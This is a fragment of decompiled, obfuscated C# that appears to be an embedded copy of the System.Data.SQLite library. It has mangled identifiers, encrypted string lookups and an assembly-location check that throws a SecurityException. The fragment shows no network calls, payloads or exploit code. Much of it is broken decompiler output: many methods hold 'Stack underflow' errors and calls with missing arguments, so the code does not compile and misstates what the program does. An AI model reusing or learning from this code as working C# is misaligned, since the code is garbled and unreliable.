							global::_0080._0014._0001(107397030),
							7
						}
					};
				}
				if (global::_0008._0015._0001.TryGetValue(key, out var value))
				{
					switch (value)
					{
					case 0:
					case 1:
					case 2:
					case 3:
						return true;
					case 4:
					case 5:
					case 6:
					case 7:
						return false;
					}
				}
			}
			throw new ArgumentException(global::_0080._0014._0001(107405727));
		}

		internal static bool _0002(string _0002)
		{
			//IL_0036: Incompatible stack heights: 0 vs 2
			//IL_003d: Incompatible stack heights: 0 vs 2
			//IL_0044: Incompatible stack heights: 0 vs 1
			_ = _0098_0003._0098_0007;
			_ = 7;
			_008F_0003._008B_0007();
			long num = default(long);
			/*Error near IL_0044: Stack underflow*/((string)/*Error near IL_0044: Stack underflow*/, (NumberStyles)/*Error near IL_0044: Stack underflow*/, (IFormatProvider)/*Error near IL_0044: Stack underflow*/, ref num);
			if ((int)/*Error near IL_0015: Stack underflow*/ == 0)
			{
				return false;
			}
			return _0099_0003._0099_0007(num.ToString(_008F_0003._008B_0007()), _0002, StringComparison.Ordinal);
		}

		internal static bool _0003(string _0002)
		{
			//IL_003a: Incompatible stack heights: 0 vs 2
			//IL_0041: Incompatible stack heights: 0 vs 2
			//IL_0048: Incompatible stack heights: 0 vs 1
			_ = _009A_0003._009A_0007;
			_ = 231;
			_008F_0003._008B_0007();
			double num = default(double);
			/*Error near IL_0048: Stack underflow*/((string)/*Error near IL_0048: Stack underflow*/, (NumberStyles)/*Error near IL_0048: Stack underflow*/, (IFormatProvider)/*Error near IL_0048: Stack underflow*/, ref num);
			if ((int)/*Error near IL_0019: Stack underflow*/ == 0)
			{
				return false;
			}
			return _0099_0003._0099_0007(num.ToString(_008F_0003._008B_0007()), _0002, StringComparison.Ordinal);
		}

		static _001A()
		{
			//IL_08bc: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly = (Assembly)/*Error near IL_08c3: Stack underflow*/;
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (!global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) || !flag || !global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				throw new SecurityException(global::_0080._0014._0001(107396706));
			}
			_001A._0002 = string.Empty;
			_001A._0001 = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
			_001A.m__0001 = 2415018.5;
			_001A._0001 = global::_0011._0018._0001(DateTime.MinValue);
			_001A._0002 = global::_0011._0018._0001(DateTime.MaxValue);
			_001A._0001 = new string[31]
			{
				global::_0080._0014._0001(107405683),
				global::_0080._0014._0001(107405638),
				global::_0080._0014._0001(107405661),
				global::_0080._0014._0001(107405604),
				global::_0080._0014._0001(107405623),
				global::_0080._0014._0001(107405582),
				global::_0080._0014._0001(107405029),
				global::_0080._0014._0001(107405000),
				global::_0080._0014._0001(107404975),
				global::_0080._0014._0001(107404934),
				global::_0080._0014._0001(107404909),
				global::_0080._0014._0001(107404912),
				global::_0080._0014._0001(107404891),
				global::_0080._0014._0001(107404838),
				global::_0080._0014._0001(107404805),
				global::_0080._0014._0001(107404824),
				global::_0080._0014._0001(107405295),
				global::_0080._0014._0001(107405302),
				global::_0080._0014._0001(107405257),
				global::_0080._0014._0001(107405248),
				global::_0080._0014._0001(107405243),
				global::_0080._0014._0001(107405214),
				global::_0080._0014._0001(107405157),
				global::_0080._0014._0001(107405120),
				global::_0080._0014._0001(107405095),
				global::_0080._0014._0001(107405066),
				global::_0080._0014._0001(107405077),
				global::_0080._0014._0001(107404516),
				global::_0080._0014._0001(107404483),
				global::_0080._0014._0001(107404498),
				global::_0080._0014._0001(107404453)
			};
			_001A._0003 = _001A._0001[5];
			_0004 = _001A._0001[19];
			_001A._0001 = new UTF8Encoding();
			_001A._0001 = new Type[8]
			{
				_0091._0080_0004(typeof(object).TypeHandle),
				_0091._0080_0004(typeof(long).TypeHandle),
				_0091._0080_0004(typeof(double).TypeHandle),
				_0091._0080_0004(typeof(string).TypeHandle),
				_0091._0080_0004(typeof(byte[]).TypeHandle),
				_0091._0080_0004(typeof(object).TypeHandle),
				_0091._0080_0004(typeof(DateTime).TypeHandle),
				_0091._0080_0004(typeof(object).TypeHandle)
			};
			_001A._0001 = new DbType[19]
			{
				DbType.Object,
				DbType.Binary,
				DbType.Object,
				DbType.Boolean,
				DbType.SByte,
				DbType.SByte,
				DbType.Byte,
				DbType.Int16,
				DbType.UInt16,
				DbType.Int32,
				DbType.UInt32,
				DbType.Int64,
				DbType.UInt64,
				DbType.Single,
				DbType.Double,
				DbType.Decimal,
				DbType.DateTime,
				DbType.Object,
				DbType.String
			};
			_001A._0001 = new int[26]
			{
				2147483647, 2147483647, 1, 1, 8, 8, 8, 8, 8, 16,
				2, 4, 8, 2147483647, 1, 4, 2147483647, 8, 2, 4,
				8, 8, 2147483647, 2147483647, 2147483647, 2147483647
			};
			_001A._0001 = new object[26]
			{
				DBNull.Value,
				DBNull.Value,
				3,
				DBNull.Value,
				19,
				DBNull.Value,
				DBNull.Value,
				53,
				53,
				DBNull.Value,
				5,
				10,
				19,
				DBNull.Value,
				3,
				24,
				DBNull.Value,
				DBNull.Value,
				5,
				10,
				19,
				53,
				DBNull.Value,
				DBNull.Value,
				DBNull.Value,
				DBNull.Value
			};
			_001A._0002 = new object[26]
			{
				DBNull.Value,
				DBNull.Value,
				0,
				DBNull.Value,
				4,
				DBNull.Value,
				DBNull.Value,
				DBNull.Value,
				DBNull.Value,
				DBNull.Value,
				0,
				0,
				0,
				DBNull.Value,
				0,
				DBNull.Value,
				DBNull.Value,
				DBNull.Value,
				0,
				0,
				0,
				0,
				DBNull.Value,
				DBNull.Value,
				DBNull.Value,
				DBNull.Value
			};
			_001A._0002 = new Type[26]
			{
				_0091._0080_0004(typeof(string).TypeHandle),
				_0091._0080_0004(typeof(byte[]).TypeHandle),
				_0091._0080_0004(typeof(byte).TypeHandle),
				_0091._0080_0004(typeof(bool).TypeHandle),
				_0091._0080_0004(typeof(decimal).TypeHandle),
				_0091._0080_0004(typeof(DateTime).TypeHandle),
				_0091._0080_0004(typeof(DateTime).TypeHandle),
				_0091._0080_0004(typeof(decimal).TypeHandle),
				_0091._0080_0004(typeof(double).TypeHandle),
				_0091._0080_0004(typeof(Guid).TypeHandle),
				_0091._0080_0004(typeof(short).TypeHandle),
				_0091._0080_0004(typeof(int).TypeHandle),
				_0091._0080_0004(typeof(long).TypeHandle),
				_0091._0080_0004(typeof(object).TypeHandle),
				_0091._0080_0004(typeof(sbyte).TypeHandle),
				_0091._0080_0004(typeof(float).TypeHandle),
				_0091._0080_0004(typeof(string).TypeHandle),
				_0091._0080_0004(typeof(DateTime).TypeHandle),
				_0091._0080_0004(typeof(ushort).TypeHandle),
				_0091._0080_0004(typeof(uint).TypeHandle),
				_0091._0080_0004(typeof(ulong).TypeHandle),
				_0091._0080_0004(typeof(double).TypeHandle),
				_0091._0080_0004(typeof(string).TypeHandle),
				_0091._0080_0004(typeof(string).TypeHandle),
				_0091._0080_0004(typeof(string).TypeHandle),
				_0091._0080_0004(typeof(string).TypeHandle)
			};
			_001A._0001 = new global::_0014._0017[19]
			{
				global::_0014._0017._0006,
				global::_0014._0017._0005,
				global::_0014._0017._0006,
				global::_0014._0017._0002,
				global::_0014._0017._0002,
				global::_0014._0017._0002,
				global::_0014._0017._0002,
				global::_0014._0017._0002,
				global::_0014._0017._0002,
				global::_0014._0017._0002,
				global::_0014._0017._0002,
				global::_0014._0017._0002,
				global::_0014._0017._0002,
				global::_0014._0017._0003,
				global::_0014._0017._0003,
				global::_0014._0017._0003,
				global::_0014._0017._0007,
				global::_0014._0017._0006,
				global::_0014._0017._0004
			};
			_001A._0001 = new object();
			_001A._0001 = null;
		}
	}
}
namespace _0011
{
	internal abstract class _0013 : global::_0001._001A, IDisposable
	{
		internal new const int _0001 = -2146233088;

		internal new bool _0001;

		internal new static string[] _0001;

		internal abstract string Version { get; }

		internal abstract int VersionNumber { get; }

		internal abstract long LastInsertRowId { get; }

		internal abstract int Changes { get; }

		internal abstract long MemoryUsed { get; }

		internal abstract long MemoryHighwater { get; }

		internal abstract bool OwnHandle { get; }

		internal abstract IDictionary<_0019._007F, global::_0012._0014> Functions { get; }

		internal abstract bool AutoCommit { get; }

		internal _0013(SQLiteDateFormats _0081_0013_0006, DateTimeKind _0019_0087, string _0082_0013_0006)
			: base(_0081_0013_0006, _0019_0087, _0082_0013_0006)
		{
		}

		internal new abstract bool _0001(string _0002);

		internal new abstract _0080._0017 _0001(bool _0002);

		internal new abstract _0080._0017 _0001();

		internal new abstract _0080._0017 _0002();

		internal new abstract bool _0003();

		internal new abstract string _0001(string _0002);

		internal new abstract void _0001(string _0002, string _0003, SQLiteConnectionFlags _0004, global::_0004._0015 _0005, int _0006, bool _0007);

		internal new abstract void _0002(bool _0002);

		internal new abstract void _0001(int _0002);

		internal new abstract string _0002();

		internal new abstract string _0002(string _0002);

		internal new abstract void _0002();

		internal new abstract int _0003();

		internal new abstract global::_0013._0017 _0001(global::_0017._0080 _0002, string _0003, global::_0013._0017 _0004, uint _0005, ref string _0006);

		internal new abstract bool _0001(global::_0013._0017 _0002);

		internal new abstract bool _0002(global::_0013._0017 _0002);

		internal new abstract _0080._0017 _0001(global::_0013._0017 _0002);

		internal new abstract void _0001();

		internal new abstract void _0001(_0019._007F _0002, global::_0012._0014 _0003, SQLiteConnectionFlags _0004);

		internal new abstract bool _0001(_0019._007F _0002, SQLiteConnectionFlags _0003);

		internal new abstract void _0001(global::_0013._0017 _0002, SQLiteConnectionFlags _0003, int _0004, double _0005);

		internal new abstract void _0001(global::_0013._0017 _0002, SQLiteConnectionFlags _0003, int _0004, int _0005);

		internal new abstract void _0001(global::_0013._0017 _0002, SQLiteConnectionFlags _0003, int _0004, uint _0005);

		internal new abstract void _0001(global::_0013._0017 _0002, SQLiteConnectionFlags _0003, int _0004, long _0005);

		internal new abstract void _0001(global::_0013._0017 _0002, SQLiteConnectionFlags _0003, int _0004, ulong _0005);

		internal new abstract void _0001(global::_0013._0017 _0002, SQLiteConnectionFlags _0003, int _0004, bool _0005);

		internal new abstract void _0001(global::_0013._0017 _0002, SQLiteConnectionFlags _0003, int _0004, string _0005);

		internal new abstract void _0001(global::_0013._0017 _0002, SQLiteConnectionFlags _0003, int _0004, byte[] _0005);

		internal new abstract void _0001(global::_0013._0017 _0002, SQLiteConnectionFlags _0003, int _0004, DateTime _0005);

		internal new abstract void _0001(global::_0013._0017 _0002, SQLiteConnectionFlags _0003, int _0004);

		internal new abstract int _0001(global::_0013._0017 _0002, SQLiteConnectionFlags _0003);

		internal new abstract string _0001(global::_0013._0017 _0002, SQLiteConnectionFlags _0003, int _0004);

		internal new abstract int _0001(global::_0013._0017 _0002, SQLiteConnectionFlags _0003, string _0004);

		internal new abstract int _0001(global::_0013._0017 _0002);

		internal new abstract string _0001(global::_0013._0017 _0002, int _0003);

		internal new abstract global::_0014._0017 _0001(global::_0013._0017 _0002, int _0003);

		internal new abstract string _0001(global::_0013._0017 _0002, int _0003, ref global::_0014._0017 _0004);

		internal new abstract int _0001(global::_0013._0017 _0002, string _0003);

		internal new abstract string _0002(global::_0013._0017 _0002, int _0003);

		internal new abstract string _0003(global::_0013._0017 _0002, int _0003);

		internal new abstract string _0004(global::_0013._0017 _0002, int _0003);

		internal new abstract void _0001(string _0002, string _0003, string _0004, ref string _0005, ref string _0006, ref bool _0007, ref bool _0008, ref bool _000E);

		internal new abstract void _0001(string _0002, string _0003, string _0004, ref int _0005, ref int _0006, ref string _0007);

		internal new abstract object _0001(global::_0013._0017 _0002, int _0003);

		internal new abstract double _0001(global::_0013._0017 _0002, int _0003);

		internal new abstract bool _0001(global::_0013._0017 _0002, int _0003);

		internal new abstract sbyte _0001(global::_0013._0017 _0002, int _0003);

		internal new abstract byte _0001(global::_0013._0017 _0002, int _0003);

		internal new abstract short _0001(global::_0013._0017 _0002, int _0003);

		internal new abstract ushort _0001(global::_0013._0017 _0002, int _0003);

		internal new abstract int _0001(global::_0013._0017 _0002, int _0003);

		internal new abstract uint _0001(global::_0013._0017 _0002, int _0003);

		internal new abstract long _0001(global::_0013._0017 _0002, int _0003);

		internal new abstract ulong _0001(global::_0013._0017 _0002, int _0003);

		internal new abstract string _0005(global::_0013._0017 _0002, int _0003);

		internal new abstract long _0001(global::_0013._0017 _0002, int _0003, int _0004, byte[] _0005, int _0006, int _0007);

		internal new abstract char _0001(global::_0013._0017 _0002, int _0003);

		internal new abstract long _0001(global::_0013._0017 _0002, int _0003, int _0004, char[] _0005, int _0006, int _0007);

		internal new abstract DateTime _0001(global::_0013._0017 _0002, int _0003);

		internal new abstract bool _0002(global::_0013._0017 _0002, int _0003);

		internal new abstract _0080._0017 _0001(string _0002, global::_0006._001A _0003, global::_0006._001A _0004, bool _0005);

		internal new abstract _0080._0017 _0001(string _0002, int _0003, bool _0004, _0019._001F _0005, _0019._001F _0006, global::_0002._001C _0007, bool _0008);

		internal new abstract _0015 _0001(global::_0012._0014 _0002, IntPtr _0003);

		internal new abstract int _0001(_001E._0015 _0002, IntPtr _0003, string _0004, string _0005);

		internal new abstract int _0001(_001E._0015 _0002, IntPtr _0003, char[] _0004, char[] _0005);

		internal new abstract int _0001(IntPtr _0002);

		internal new abstract IntPtr _0001(IntPtr _0002);

		internal new abstract long _0001(IntPtr _0002, int _0003, byte[] _0004, int _0005, int _0006);

		internal new abstract double _0001(IntPtr _0002);

		internal new abstract int _0002(IntPtr _0002);

		internal new abstract long _0001(IntPtr _0002);

		internal new abstract string _0001(IntPtr _0002);

		internal new abstract global::_0014._0017 _0001(IntPtr _0002);

		internal new abstract void _0001(IntPtr _0002, byte[] _0003);

		internal new abstract void _0001(IntPtr _0002, double _0003);

		internal new abstract void _0001(IntPtr _0002, string _0003);

		internal new abstract void _0001(IntPtr _0002, int _0003);

		internal new abstract void _0001(IntPtr _0002, long _0003);

		internal new abstract void _0001(IntPtr _0002);

		internal new abstract void _0002(IntPtr _0002, string _0003);

		internal new abstract void _0001(global::_0001._0082 _0002, SQLiteConnectionFlags _0003);

		internal new abstract void _0002(global::_0001._0082 _0002, SQLiteConnectionFlags _0003);

		internal new abstract _0080._0017 _0001(global::_0001._0082 _0002, string _0003, ref string _0004);

		internal new abstract _0080._0017 _0001(global::_0001._0082 _0002, int _0003, string _0004, ref string _0005);

		internal new abstract _0080._0017 _0001(global::_0003._0013 _0002, bool _0003);

		internal new abstract void _0003(bool _0002);

		internal new abstract void _0001(string _0002, string _0003);

		internal new abstract void _0004(bool _0002);

		internal new abstract _0080._0017 _0003();

		internal new abstract _0080._0017 _0004();

		internal new abstract void _0001(_0080._0017 _0002, string _0003);

		internal new abstract void _0001(byte[] _0002);

		internal new abstract void _0002(byte[] _0002);

		internal new abstract void _0001(int _0002, _0019._001C _0003);

		internal new abstract void _0001(_0019._001D _0002);

		internal new abstract void _0001(global::_0018._001B _0002);

		internal new abstract void _0001(global::_0017._0081 _0002);

		internal new abstract void _0001(global::_0010._001D _0002);

		internal new abstract void _0001(global::_0010._001E _0002);

		internal new abstract _0080._0017 _0001(global::_0015._0015 _0002);

		internal new abstract bool _0004();

		internal new abstract int _0001(global::_0013._0017 _0002, int _0003, int _0004);

		internal new abstract long _0002(global::_0013._0017 _0002, int _0003);

		internal new abstract object _0001(global::_0013._0017 _0002, SQLiteConnectionFlags _0003, int _0004, _001F._0018 _0005);

		internal new abstract _0080._0017 _0001(string _0002, int _0003, IntPtr _0004);

		internal new abstract global::_0018._001A _0001(global::_0017._0080 _0002, string _0003, string _0004);

		internal new abstract bool _0001(global::_0018._001A _0002, int _0003, ref bool _0004);

		internal new abstract int _0001(global::_0018._001A _0002);

		internal new abstract int _0002(global::_0018._001A _0002);

		internal new abstract void _0001(global::_0018._001A _0002);

		public new void _0003()
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 2
			((_0013)/*Error near IL_001a: Stack underflow*/)._0001(_0002: true);
			_ = _0091_0002._009B_0005;
			/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/);
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0003();
		}

		protected new virtual void _0001(bool _0002)
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			if (!((_0013)/*Error near IL_0007: Stack underflow*/)._0001)
			{
				((_0013)/*Error near IL_0011: Stack underflow*/)._0001 = true;
			}
		}

		~_0013()
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			try
			{
				((_0013)/*Error near IL_000f: Stack underflow*/)._0001(_0002: false);
			}
			finally
			{
				global::_0008._009E(this);
			}
		}

		static _0013()
		{
			//IL_01ab: Incompatible stack heights: 0 vs 1
			//IL_01b5: Incompatible stack heights: 0 vs 2
			string[] array = new string[29];
			_ = 0;
			_0080._0014._0001(107404472);
			((object[])/*Error near IL_001d: Stack underflow*/)[/*Error near IL_001d: Stack underflow*/] = (object)/*Error near IL_001d: Stack underflow*/;
			array[1] = _0080._0014._0001(107404423);
			array[2] = _0080._0014._0001(107404406);
			array[3] = _0080._0014._0001(107404377);
			array[4] = _0080._0014._0001(107404344);
			array[5] = _0080._0014._0001(107404783);
			array[6] = _0080._0014._0001(107404790);
			array[7] = _0080._0014._0001(107404757);
			array[8] = _0080._0014._0001(107404704);
			array[9] = _0080._0014._0001(107404655);
			array[10] = _0080._0014._0001(107404670);
			array[11] = _0080._0014._0001(107404617);
			array[12] = _0080._0014._0001(107404604);
			array[13] = _0080._0014._0001(107404547);
			array[14] = _0080._0014._0001(107404002);
			array[15] = _0080._0014._0001(107403993);
			array[16] = _0080._0014._0001(107403936);
			array[17] = _0080._0014._0001(107403935);
			array[18] = _0080._0014._0001(107403898);
			array[19] = _0080._0014._0001(107403865);
			array[20] = _0080._0014._0001(107403808);
			array[21] = _0080._0014._0001(107403783);
			array[22] = _0080._0014._0001(107404274);
			array[23] = _0080._0014._0001(107404201);
			array[24] = _0080._0014._0001(107404172);
			array[25] = _0080._0014._0001(107404159);
			array[26] = _0080._0014._0001(107404114);
			array[27] = _0080._0014._0001(107404061);
			array[28] = _0080._0014._0001(107403488);
			_0013._0001 = array;
		}
	}
}
namespace _0002
{
	internal class _0019 : global::_0011._0013
	{
		internal new const string _0001 = "002400000480000094000000060200000024000052534131000400000100010005a288de5687c4e1b621ddff5d844727418956997f475eb829429e411aff3e93f97b70de698b972640925bdd44280df0a25a843266973704137cbb0e7441c1fe7cae4e2440ae91ab8cde3933febcb1ac48dd33b40e13c421d8215c18a4349a436dd499e3c385cc683015f886f6c10bd90115eb2bd61b67750839e3a19941dc9c";

		internal new const string _0002 = "1.0.105.2";

		internal new static object _0001;

		protected internal new global::_000E._001F _0001;

		protected new string _0003;

		protected new SQLiteConnectionFlags _0001;

		protected new bool _0001;

		protected new int _0001;

		internal new int _0002;

		private new bool m__0002;

		protected new Dictionary<global::_0019._007F, global::_0012._0014> _0001;

		protected internal new string _0004;

		protected internal new bool? _0001 = null;

		protected new string _0005 = _0080._0014._0001(107403467);

		protected new Dictionary<string, global::_0001._0082> _0001;

		internal new bool _0003;

		internal new static bool? _0002;

		private new static bool? m__0003;

		internal new static bool? _0004;

		internal override string Version
		{
			get
			{
				//IL_0008: Incompatible stack heights: 0 vs 1
				_ = SQLiteVersion;
				return (string)/*Error near IL_0003: Stack underflow*/;
			}
		}

		internal override int VersionNumber
		{
			get
			{
				//IL_0008: Incompatible stack heights: 0 vs 1
				_ = SQLiteVersionNumber;
				return (int)/*Error near IL_0003: Stack underflow*/;
			}
		}

		internal static string DefineConstants
		{
			get
			{
				//IL_0081: Incompatible stack heights: 0 vs 1
				new StringBuilder();
				StringBuilder stringBuilder = (StringBuilder)/*Error near IL_0087: Stack underflow*/;
				IList<string> list = global::_001C._0016._0001;
				IList<string> list2;
				if (true)
				{
					list2 = list;
				}
				if (list2 != null)
				{
					IEnumerator<string> enumerator = list2.GetEnumerator();
					try
					{
						while (global::_001B._007E_0086_0003(enumerator))
						{
							string current = enumerator.Current;
							if (current != null)
							{
								if (global::_001A._007E_0019_0003(stringBuilder) > 0)
								{
									_009B_0003._007E_009B_0007(stringBuilder, ' ');
								}
								_008B_0002._007E_0094_0005(stringBuilder, current);
							}
						}
					}
					finally
					{
						if (enumerator != null)
						{
							global::_0008._007E_0098(enumerator);
						}
					}
				}
				return global::_0002._007E_0006(stringBuilder);
			}
		}

		internal static string SQLiteVersion
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001();
				global::_0011._0018._0001((IntPtr)/*Error near IL_0012: Stack underflow*/, -1);
				return (string)/*Error near IL_0006: Stack underflow*/;
			}
		}

		internal static int SQLiteVersionNumber
		{
			get
			{
				//IL_0008: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001();
				return (int)/*Error near IL_0003: Stack underflow*/;
			}
		}

		internal static string SQLiteSourceId
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001();
				global::_0011._0018._0001((IntPtr)/*Error near IL_0012: Stack underflow*/, -1);
				return (string)/*Error near IL_0006: Stack underflow*/;
			}
		}

		internal static string SQLiteCompileOptions
		{
			get
			{
				//IL_0076: Incompatible stack heights: 0 vs 1
				new StringBuilder();
				StringBuilder stringBuilder = (StringBuilder)/*Error near IL_007c: Stack underflow*/;
				int num;
				if (true)
				{
					num = 0;
				}
				IntPtr intPtr = global::_0011._0018._0001(num++);
				while (_0090_0002._0099_0005(intPtr, IntPtr.Zero))
				{
					if (global::_001A._007E_0019_0003(stringBuilder) > 0)
					{
						_009B_0003._007E_009B_0007(stringBuilder, ' ');
					}
					_008B_0002._007E_0094_0005(stringBuilder, global::_0011._0018._0001(intPtr, -1));
					intPtr = global::_0011._0018._0001(num++);
				}
				return global::_0002._007E_0006(stringBuilder);
			}
		}

		internal static string InteropVersion
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001();
				global::_0011._0018._0001((IntPtr)/*Error near IL_0012: Stack underflow*/, -1);
				return (string)/*Error near IL_0006: Stack underflow*/;
			}
		}

		internal static string InteropSourceId
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001();
				global::_0011._0018._0001((IntPtr)/*Error near IL_0012: Stack underflow*/, -1);
				return (string)/*Error near IL_0006: Stack underflow*/;
			}
		}

		internal static string InteropCompileOptions
		{
			get
			{
				//IL_0076: Incompatible stack heights: 0 vs 1
				new StringBuilder();
				StringBuilder stringBuilder = (StringBuilder)/*Error near IL_007c: Stack underflow*/;
				int num;
				if (true)
				{
					num = 0;
				}
				IntPtr intPtr = global::_0011._0018._0001(num++);
				while (_0090_0002._0099_0005(intPtr, IntPtr.Zero))
				{
					if (global::_001A._007E_0019_0003(stringBuilder) > 0)
					{
						_009B_0003._007E_009B_0007(stringBuilder, ' ');
					}
					_008B_0002._007E_0094_0005(stringBuilder, global::_0011._0018._0001(intPtr, -1));
					intPtr = global::_0011._0018._0001(num++);
				}
				return global::_0002._007E_0006(stringBuilder);
			}
		}

		internal override bool AutoCommit
		{
			get
			{
				//IL_0017: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 2
				//IL_0021: Incompatible stack heights: 0 vs 1
				_ = ((_0019)/*Error near IL_0007: Stack underflow*/)._0001;
				global::_000E._001F._0001(((_0019)/*Error near IL_000e: Stack underflow*/)._0001);
				return global::_0011._0018._0001((global::_000E._001F)/*Error near IL_0015: Stack underflow*/, (IntPtr)/*Error near IL_0015: Stack underflow*/);
			}
		}

		internal override long LastInsertRowId
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0014: Incompatible stack heights: 0 vs 1
				//IL_001b: Incompatible stack heights: 0 vs 1
				global::_000E._001F._0001(((_0019)/*Error near IL_0007: Stack underflow*/)._0001);
				global::_0011._0018._0001((IntPtr)/*Error near IL_001b: Stack underflow*/);
				return (long)/*Error near IL_000c: Stack underflow*/;
			}
		}

		internal override int Changes
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0014: Incompatible stack heights: 0 vs 1
				//IL_001b: Incompatible stack heights: 0 vs 1
				global::_000E._001F._0001(((_0019)/*Error near IL_0007: Stack underflow*/)._0001);
				global::_0011._0018._0001((IntPtr)/*Error near IL_001b: Stack underflow*/);
				return (int)/*Error near IL_000c: Stack underflow*/;
			}
		}

		internal override long MemoryUsed
		{
			get
			{
				//IL_0008: Incompatible stack heights: 0 vs 1
				_ = StaticMemoryUsed;
				return (long)/*Error near IL_0003: Stack underflow*/;
			}
		}

		internal static long StaticMemoryUsed
		{
			get
			{
				//IL_0008: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001();
				return (long)/*Error near IL_0003: Stack underflow*/;
			}
		}

		internal override long MemoryHighwater
		{
			get
			{
				//IL_0008: Incompatible stack heights: 0 vs 1
				_ = StaticMemoryHighwater;
				return (long)/*Error near IL_0003: Stack underflow*/;
			}
		}

		internal static long StaticMemoryHighwater
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001(0);
				return (long)/*Error near IL_0004: Stack underflow*/;
			}
		}

		internal override bool OwnHandle
		{
			get
			{
				//IL_0020: Incompatible stack heights: 0 vs 1
				//IL_0027: Incompatible stack heights: 0 vs 1
				//IL_002e: Incompatible stack heights: 0 vs 1
				if (((_0019)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					_0080._0014._0001(107403367);
					new SQLiteException((string)/*Error near IL_002e: Stack underflow*/);
					throw /*Error near IL_0013: Stack underflow*/;
				}
				return this._0001._0001;
			}
		}

		internal override IDictionary<global::_0019._007F, global::_0012._0014> Functions => ((_0019)/*Error near IL_0007: Stack underflow*/)._0001;

		internal _0019(SQLiteDateFormats _0081_0013_0006, DateTimeKind _0019_0087, string _0082_0013_0006, IntPtr _0091_0016_0006, string _0089_0015, bool _000F_0017_0006)
			: base(_0081_0013_0006, _0019_0087, _0082_0013_0006)
		{
			if (_0091_0016_0006 != IntPtr.Zero)
			{
				this._0001 = new global::_000E._001F(_0091_0016_0006, _000F_0017_0006);
				this._0003 = _0089_0015;
				global::_0017._0080._0001(null, new _001A(global::_000E._001D._0010, null, null, null, null, this._0001, _0089_0015, new object[7]
				{
					typeof(_0019),
					_0081_0013_0006,
					_0019_0087,
					_0082_0013_0006,
					_0091_0016_0006,
					_0089_0015,
					_000F_0017_0006
				}));
			}
		}

		protected override void _0001(bool _0002)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			try
			{
				if (!((_0019)/*Error near IL_0007: Stack underflow*/)._0003)
				{
					((_0019)/*Error near IL_0021: Stack underflow*/)._0004();
					this._0002(_0002: false);
				}
			}
			finally
			{
				base._0001(_0002);
				this._0003 = true;
			}
		}

		private new void _0004()
		{
			//IL_0054: Incompatible stack heights: 0 vs 1
			//IL_0057: Incompatible stack heights: 0 vs 1
			//IL_005e: Incompatible stack heights: 0 vs 1
			if (((_0019)/*Error near IL_0007: Stack underflow*/)._0001 == null)
			{
				return;
			}
			((_0019)/*Error near IL_0010: Stack underflow*/)._0001.GetEnumerator();
			using (Dictionary<string, global::_0001._0082>.Enumerator enumerator = /*Error near IL_0013: Stack underflow*/)
			{
				while (enumerator.MoveNext())
				{
					enumerator.Current.Value?._0001();
				}
			}
			this._0001.Clear();
		}

		internal override void _0002(bool _0002)
		{
			//IL_0130: Incompatible stack heights: 0 vs 1
			//IL_0136: Incompatible stack heights: 0 vs 1
			//IL_013c: Incompatible stack heights: 0 vs 1
			if (((_0019)/*Error near IL_000a: Stack underflow*/)._0001 == null)
			{
				return;
			}
			if (!((_0019)/*Error near IL_0019: Stack underflow*/)._0001._0001)
			{
				((_0019)/*Error near IL_002b: Stack underflow*/)._0001 = null;
				return;
			}
			bool flag = (this._0001 & SQLiteConnectionFlags.UnbindFunctionsOnClose) == SQLiteConnectionFlags.UnbindFunctionsOnClose;
			if (this._0001)
			{
				global::_000E._001F obj = this._0001;
				IntPtr intPtr = global::_000E._001F._0001(this._0001);
				if (global::_0011._0018._0001(_0002, intPtr, obj))
				{
					if (flag)
					{
						global::_0011._0018._0001((global::_0011._0013)this, this._0001, _0004: false);
					}
					_0004();
					string text = this._0003;
					global::_000E._001F obj2 = this._0001;
					int num = this._0001;
					global::_0011._0018._0001(num, obj2, text);
					global::_0017._0080._0001(null, new _001A(global::_000E._001D._0017, null, null, null, null, this._0001, this._0003, new object[4]
					{
						_0091._0080_0004(typeof(_0019).TypeHandle),
						_0002,
						this._0003,
						this._0001
					}));
				}
			}
			else
			{
				if (flag)
				{
					global::_0011._0018._0001((global::_0011._0013)this, this._0001, _0004: false);
				}
				global::_0008._007E_0007_0002(this._0001);
			}
			this._0001 = null;
		}

		internal override void _0001()
		{
			try
			{
			}
			finally
			{
				_0006_0003._0084_0006(ref this._0002);
				global::_0011._0018._0001(global::_000E._001F._0001(this._0001));
			}
		}

		internal override void _0001(global::_0019._007F _0002, global::_0012._0014 _0003, SQLiteConnectionFlags _0004)
		{
			//IL_004c: Incompatible stack heights: 0 vs 1
			//IL_0053: Incompatible stack heights: 0 vs 1
